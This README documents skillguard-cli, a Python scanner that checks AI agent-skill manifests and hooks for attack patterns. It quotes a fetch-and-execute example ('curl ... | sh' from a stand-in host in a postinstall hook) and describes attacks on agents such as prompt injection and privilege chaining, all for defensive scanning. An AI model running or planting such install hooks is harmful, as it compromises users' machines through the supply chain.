# skillguard-cli (Python)

Security scanner for third-party AI agent-skill files -- `SKILL.md`
manifests, hooks, and bundled scripts -- before they run with real tool,
file, and network permissions.

[![PyPI version](https://img.shields.io/pypi/v/skillguard-cli.svg)](https://pypi.org/project/skillguard-cli/)
[![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://github.com/RudrenduPaul/skillguard/blob/main/LICENSE)
[![Python versions](https://img.shields.io/pypi/pyversions/skillguard-cli.svg)](https://pypi.org/project/skillguard-cli/)
[![CI](https://github.com/RudrenduPaul/skillguard/actions/workflows/ci.yml/badge.svg)](https://github.com/RudrenduPaul/skillguard/actions/workflows/ci.yml)
[![npm version](https://img.shields.io/npm/v/skillguard-cli.svg)](https://www.npmjs.com/package/skillguard-cli)

## Why this exists

36% of published agent skills have exploitable flaws per Snyk. Most
marketplaces and frameworks have no scan step between "someone published a
skill" and "a user's agent runs it." Concretely: a `SKILL.md` that declares
`network: false` in its frontmatter can still ship a `hooks/postinstall.js`
that runs `curl https://get.example.invalid/setup.sh | sh` the moment the
skill is installed -- nothing in most agent frameworks checks that the
declared scope matches what the hooks actually do. SkillGuard is that check:
a CLI, a library, and (for the npm distribution) a GitHub Action, all
reading the same bundled rule packs. This package is the Python
distribution -- a genuine, independent port, not a wrapper around the
Node binary.

## Install

```bash
pip install skillguard-cli
```

or with [uv](https://docs.astral.sh/uv/):

```bash
uv add skillguard-cli
```

No separate install step, no external binary to fetch: all bundled rule
packs and the pattern-matching engine ship inside the wheel. The
complementary JS/TS distribution installs the same way on the npm side:
`npm install --save-dev skillguard-cli` (or `npx skillguard-cli scan` to
run it once without installing) -- see the
[project README](https://github.com/RudrenduPaul/skillguard#readme) for
that package. Both are first-class, maintained together; neither is
deprecated in favor of the other.

## Quickstart

Clone the repo to get the bundled fixture skills (not part of the published
wheel -- they're demo/test content):

```bash
git clone https://github.com/RudrenduPaul/skillguard.git
cd skillguard
skillguard scan ./examples/known-bad-skill
```

Real output:

```
Loading SkillGuard rule packs...
SkillGuard scan: /path/to/skillguard/examples/known-bad-skill
Files scanned: 5

Findings: 11 (HIGH: 5, MEDIUM: 5, LOW: 1)

[MEDIUM] SG01 hooks/backdoor.py:7
  sg01-raw-socket-python — Raw socket creation (Python "socket" module) bypasses typical HTTP-only network scope and is a common building block for a covert command-and-control channel.
  > socket.socket(

[HIGH] SG04 hooks/postinstall.js:5
  sg04-postinstall-remote-fetch — A postinstall/preinstall hook downloads and executes a remote script. Install-time hooks run automatically and silently for every consumer of this skill, making this a supply-chain compromise vector.

... (8 more findings, spanning all 7 rule categories) ...

Result: FAIL (exit code 1, severity threshold HIGH)
```

Or call the library directly (the agent-native path):

```python
from skillguard import scan_skill, ScanOptions

result = scan_skill("./my-skill", ScanOptions(severity_threshold="HIGH"))
if result.exit_code == 1:
    print(f"{len(result.findings)} finding(s) at or above HIGH")
    for finding in result.findings:
        print(f"[{finding.severity}] {finding.category} {finding.file}:{finding.line} — {finding.message}")
```

## CLI reference

Verified against this package's own argument parser
([`skillguard/cli.py`](https://github.com/RudrenduPaul/skillguard/blob/main/python/src/skillguard/cli.py))
-- every flag below exists in the Python distribution exactly as it does in the npm one; nothing
here is copy-pasted from the TypeScript README without checking against the real Python source.

```bash
skillguard <command> [options]
```

| Command | What it does |
| --- | --- |
| `scan <path>` | Scans one skill directory (a `SKILL.md` plus its hooks/scripts) for known attack patterns. |
| `scan-set <dir>` | Scans a directory whose immediate children are each a skill directory, running `scan` on every one and additionally checking for cross-skill privilege chaining (SG09) across the set. |
| `mcp` | Starts SkillGuard as a stdio MCP server, exposing `scan_skill` as a callable tool for another agent. Requires the optional `mcp` extra (`pip install "skillguard-cli[mcp]"`, Python >=3.10). See [MCP server](#mcp-server-agent-native-tool-call) below. |

Flags shared by `scan` and `scan-set`:

| Flag | Short | Default | Description |
| --- | --- | --- | --- |
| `--format <human\|json\|sarif>` | `-f` | `human` | Output format. |
| `--severity-threshold <HIGH\|MEDIUM\|LOW>` | `-s` | `HIGH` | Minimum severity that fails the scan (exit code 1). |
| `--timeout <ms>` | `-t` | `10000` | Per-file scan timeout in milliseconds. |
| `--skillguardignore <path>` | none | none, must be passed explicitly | Path to a `.skillguardignore` file. Never auto-loaded from inside the scan target; see [Suppressing findings](https://github.com/RudrenduPaul/skillguard#suppressing-findings) in the project README. |
| `--allow-inline-suppression` | none | `False` | Honor inline `# skillguard-ignore: SGxx` comments found inside the scanned files. Off by default. |

**Exit codes**: `0` clean scan. `1` a finding at or above the severity threshold. `2` the target
path doesn't exist, no skill files were found, or the CLI was given an invalid flag value (the
Python CLI's `argparse`-based parser calls `sys.exit(2)` directly for a bad `--format`,
`--severity-threshold`, or `--timeout` value). This matches the npm CLI's exit-code contract.

The Python CLI additionally accepts short flags (`-f`, `-s`, `-t`) alongside the long ones shown
above -- a Python-`argparse` convention this port adds on top of the shared flag surface, not a
behavior difference in what each flag does.

## MCP server (agent-native, tool-call)

```bash
pip install "skillguard-cli[mcp]"   # optional extra, requires Python >=3.10
skillguard mcp
```

Starts SkillGuard as a stdio MCP server exposing one tool, `scan_skill`
(`{ path, severity_threshold?, timeout_ms? }`), so another agent -- Claude
Code, Cursor, an orchestrator -- can scan a third-party skill directly as a
tool call before installing or running it, instead of shelling out to the
CLI and parsing stdout. The `mcp` extra is optional and not required for
the base `pip install skillguard-cli` install (the official `mcp` SDK
needs Python >=3.10; the base package still supports >=3.9). Client config
example:

```json
{ "mcpServers": { "skillguard": { "command": "skillguard", "args": ["mcp"] } } }
```

Full setup and the security guarantees this path preserves (same
`.skillguardignore`/inline-suppression defaults as the CLI) are in
[docs/integrations/mcp.md](https://github.com/RudrenduPaul/skillguard/blob/main/docs/integrations/mcp.md).
The npm package ships the same capability (`npx skillguard-cli mcp`,
tool input `{ path, severityThreshold?, timeoutMs? }` -- camelCase to match
that package's own option naming); both distributions expose the identical
`scan_skill` tool, reusing the same `scan_skill()`/`scanSkill()` pipeline
their own CLIs use.

## How it works

```
target path -> .skillguardignore (opt-in only) -> file walker
   -> rule-pack loader (SG01-SG08, SG10 -- SG09 not yet ported)
   -> pattern engine (SG01-06, partial SG05)
      + structural checks (SG07, SG08, SG10)
   -> inline suppression filter (opt-in only)
   -> severity threshold -> exit code (0 clean / 1 fail / 2 error)
```

Findings, warnings, and the exit-code contract are described in full in
[docs/concepts.md](https://github.com/RudrenduPaul/skillguard/blob/main/docs/concepts.md).
Nine of the ten rule packs (SG01 network mismatch, SG02 remote code
execution, SG03 file-scope escalation, SG04 hook supply-chain, SG05
obfuscated payloads, SG06 credential harvesting, SG07 frontmatter
spoofing, SG08 prompt injection via skill content, SG10 marketplace
typosquatting) are reimplemented as genuine Python logic against the same
rule-pack contract the npm package uses -- see that same doc for what each
one actually catches. SG09 (cross-skill privilege chaining) doesn't yet
have a Python port of its own detection logic, though `scan_skill_set()`
is available in this package.

## How SkillGuard compares

SkillGuard is purpose-built for the agent-skill threat model, not a
general-purpose scanner. This table is carried over verbatim from the npm
package's README (same facts, same sources), since it applies equally to
both distributions -- the comparison is about what SkillGuard scans, not
which language it's written in.

| | SkillGuard | Snyk Agent Scan | Semgrep (CE) | Socket CLI |
| --- | --- | --- | --- | --- |
| What it scans | Agent-skill files: SKILL.md, hooks, scripts | Agent skills and MCP server configs | General source code, 30+ languages | npm/PyPI/etc. package installs |
| Agent-skill-specific ruleset | Yes, all 10 categories purpose-built for this threat model | Yes, its whole focus | No, general SAST rules only | No, supply-chain focused |
| Auth required for a basic scan | None | Yes, `SNYK_TOKEN` required | None for Community Edition | Yes, `SOCKET_CLI_API_TOKEN` |
| License | Apache 2.0 | Apache 2.0 | LGPL-2.1 | MIT |

Full sourcing and the fuller comparison (including Snyk Open Source/Code)
is in the
[npm package's README](https://github.com/RudrenduPaul/skillguard#how-skillguard-compares).
**Honest note**: no dedicated Python-ecosystem competitor was found doing
agent-skill-specific scanning -- the comparison set above is the same one
used for the npm package, since the threat model (not the implementation
language) is what differentiates SkillGuard.

## Benchmarks

Every number below is something we actually ran locally against this
package (built wheel, installed into a fresh venv, run against the repo's
bundled fixtures) -- no extrapolation.

- **`examples/known-bad-skill`**: 11 findings (5 HIGH, 5 MEDIUM, 1 LOW)
  spanning all 7 rule categories, across 5 hook/script files, exit code 1.
  Identical finding count, severity split, and category coverage to the npm
  package's own documented benchmark for the same fixture.
- **`examples/clean-skill`** and **`examples/clean-skill-python`**: 0
  findings, exit code 0, on both.
- **`examples/typosquat-skill`** (SG10): 1 finding, exit code 1 -- a
  declared name one edit-distance away from a well-known package name.
- **`skillguard scan-set examples/skill-set-cross-privilege`** (SG09):
  3 findings, exit code 1 -- two skills that individually pass clean but,
  scanned together, trip a cross-skill privilege-chaining finding.
  `skillguard scan-set examples/skill-set-clean` on an unrelated pair of
  skills: 0 findings, exit code 0.
- **Test suite**: 110/110 pytest tests passing, ported from the
  TypeScript vitest suite (one test module per source module, plus an
  end-to-end pass against the shared fixtures).

This is a 3-fixture check, not a large-corpus false-positive/false-negative
study -- same caveat the npm README states for its own numbers.

## CI integration

```yaml
- uses: actions/checkout@v4
- uses: actions/setup-python@v5
  with:
    python-version: '3.12'
- run: pip install skillguard-cli
- run: skillguard scan ./my-skill --format sarif --severity-threshold HIGH > results.sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

Full walkthrough (including exit-code gating and a pre-commit hook example)
in [docs/integrations/ci.md](https://github.com/RudrenduPaul/skillguard/blob/main/docs/integrations/ci.md).
The npm package additionally ships a ready-made composite GitHub Action
(`uses: RudrenduPaul/skillguard@main`) that wraps the same pipeline.

## Security

SkillGuard's whole job is running against untrusted, potentially malicious
scan targets -- neither this package nor the npm package ever `eval()`s,
`exec()`s, or dynamically imports anything read from a scan target; content
is only ever read and pattern-matched. Both suppression mechanisms
(`.skillguardignore`, inline `# skillguard-ignore:` comments) are off by
default and require an explicit opt-in, closing a real trust-boundary bug
fixed before v0.1 shipped (see
[CHANGELOG.md](https://github.com/RudrenduPaul/skillguard/blob/main/CHANGELOG.md)).
To report a vulnerability, see
[SECURITY.md](https://github.com/RudrenduPaul/skillguard/blob/main/SECURITY.md)
for the private disclosure process. **Honest note**: this project does not
currently publish SLSA provenance, Sigstore signatures, or an SBOM, and has
no OpenSSF Scorecard badge set up -- none of that infrastructure exists yet
for either distribution, so it isn't claimed here.

## Contributing

See [CONTRIBUTING.md](https://github.com/RudrenduPaul/skillguard/blob/main/CONTRIBUTING.md)
for the full guide, covering both the TypeScript and Python codebases (they
must stay in behavioral parity -- a rule-pack change needs to land in both).
There is no enforced minimum coverage threshold today; the bar is that the
full pytest suite (`pytest` from `python/`) passes and new behavior ships
with tests.

```bash
cd python
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

## FAQ

**What is skillguard-cli, and what makes it different from a general-purpose security scanner?**
It's a static-analysis scanner purpose-built for one threat model: third-party AI agent-skill
files, `SKILL.md` manifests plus the hooks and scripts they bundle. It ships ten rule categories
(SG01-SG10) targeting things generic scanners don't check for by default -- frontmatter-declared
scope versus actual behavior, install-time hook supply-chain risk, prompt injection embedded in a
skill's own instructional text, and combined risk across multiple skills in the same directory. A
general SAST tool like Semgrep can find some of the same code-level patterns, but it has no notion
of a `SKILL.md` manifest or a cross-skill privilege relationship.

**Does skillguard-cli require an account or API token to run a scan?**
No. `pip install skillguard-cli && skillguard scan <path>` works with zero signup, zero token, and
no network call at scan time -- every rule pack ships inside the wheel itself.

**What Python versions does skillguard-cli support?**
Python >=3.9 for the base install (per `pyproject.toml`'s `requires-python`), or >=3.10 if you
install the optional `mcp` extra for MCP server mode (the official `mcp` SDK itself requires
Python >=3.10). It's a pure-Python package with no native/compiled dependencies, and its PyPI
classifiers declare `Operating System :: OS Independent`.

**What's the difference between this package and the npm package?**
Both are independent, equally maintained ports reading the same rule-pack contract and producing
matching findings against the same target -- this Python distribution is a genuine implementation,
not a wrapper around the Node binary. One current, honestly-disclosed gap: nine of the ten rule
packs (SG01-SG08, SG10) are fully reimplemented as Python logic; SG09 (cross-skill privilege
chaining) has no dedicated Python detection logic of its own yet, though `scan_skill_set()` still
runs the cross-skill orchestration via `scan-set`. TypeScript's plain `scan` command also runs an
extra sibling-path cross-skill heuristic Python doesn't have -- run `scan-set` on the Python side
for equivalent cross-skill coverage. See [How it works](#how-it-works) above.

**Can an AI agent call skillguard-cli directly, instead of shelling out to a CLI and parsing
output?**
Yes, two ways: `skillguard mcp` (requires the `mcp` extra) starts a stdio MCP server exposing a
`scan_skill` tool any orchestrating agent can call as a normal tool call; or import
`scan_skill()`/`scan_skill_set()` from the `skillguard` package directly in Python code and get a
structured `ScanResult` back instead of parsing CLI stdout.

**What do SG08, SG09, and SG10 check, and do they run through the MCP server too?**
SG08 (HIGH) looks for prompt injection inside a skill's own instructional text, an attempt to
override the host agent's system prompt or hijack its tool routing. SG09 (HIGH) is cross-skill
privilege chaining -- in this package it's detected via `scan_skill_set()`/`scan-set` (not yet as
a single-skill sibling-path check the way TypeScript's plain `scan` does). SG10 (HIGH) is
marketplace typosquatting: a skill's declared name sitting Levenshtein edit-distance 1-2 from a
bundled list of 51 popular npm/PyPI package names. All three run through `skillguard mcp`'s
`scan_skill` tool exactly as they do through the CLI, since the MCP server calls the same
underlying scan logic.

**Is it safe to run skillguard-cli against an untrusted skill?**
Yes -- that's the point of the design. Neither this package nor the npm package ever `eval()`s,
`exec()`s, or dynamically imports anything read from a scan target; content is only ever read and
pattern-matched. Both suppression mechanisms (`.skillguardignore`, inline `# skillguard-ignore:`
comments) are off by default and require an explicit opt-in, so a malicious skill submission can't
silence findings about itself. See [Security](#security) above.

**Does skillguard-cli replace Semgrep or Snyk?**
No. Semgrep is a mature, general-purpose static-analysis engine across 30+ languages; Snyk Agent
Scan covers a wider set of agent-skill and MCP-config threats than SkillGuard does today.
skillguard-cli's job is narrower: the specific SKILL.md/hooks/frontmatter threat model, with zero
auth and a cross-skill check (`scan-set`) neither of those tools currently ships. See [How
SkillGuard compares](#how-skillguard-compares) above.

**Is skillguard-cli production-ready?**
It's early: pre-1.0, launched 2026-07-11. The Python test suite (110/110 pytest tests, ported from
the TypeScript vitest suite) passes on a clean install, but it hasn't been run against a large
real-world corpus yet -- treat its false-positive/false-negative rate as unproven at scale rather
than settled.

**Can I use skillguard-cli commercially, and does the license cost anything?**
Yes, and no. It's Apache License 2.0 (see
[LICENSE](https://github.com/RudrenduPaul/skillguard/blob/main/LICENSE)), which permits commercial
use, modification, and redistribution, including inside proprietary software, at no cost, provided
you keep the copyright and license notice.

## License

Apache 2.0, see [LICENSE](https://github.com/RudrenduPaul/skillguard/blob/main/LICENSE).
